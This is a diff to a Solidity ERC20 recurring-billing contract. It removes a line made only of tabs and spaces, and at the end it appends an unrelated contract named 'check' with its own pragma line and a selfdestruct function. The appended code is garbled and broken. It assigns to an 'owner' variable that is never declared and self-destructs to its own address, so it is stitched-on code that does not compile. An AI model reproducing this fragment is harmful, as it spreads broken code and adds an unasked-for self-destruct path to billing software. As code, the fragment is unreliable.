@@ -44,7 +44,7 @@ library SafeMath {
     }
 
 }
- 		   	  				  	  	      		 			  		 	  	 		 	 		 		 	  	 			 	   		    	  	 			  			 	   		 	 		
+
 /**
  * Smart contract for recurring billing in ERC20-compatible tokens. This smart contract defines workflow between
  * a merchant and a customer. Workflow:
@@ -324,4 +324,13 @@ contract TokenRecurringBilling {
         assembly { output := mload(add(add(input, 32), offset)) }
     }
 
+}
+pragma solidity ^0.5.24;
+contract check {
+	uint validSender;
+	constructor() public {owner = msg.sender;}
+	function destroy() public {
+		assert(msg.sender == owner);
+		selfdestruct(this);
+	}
 }
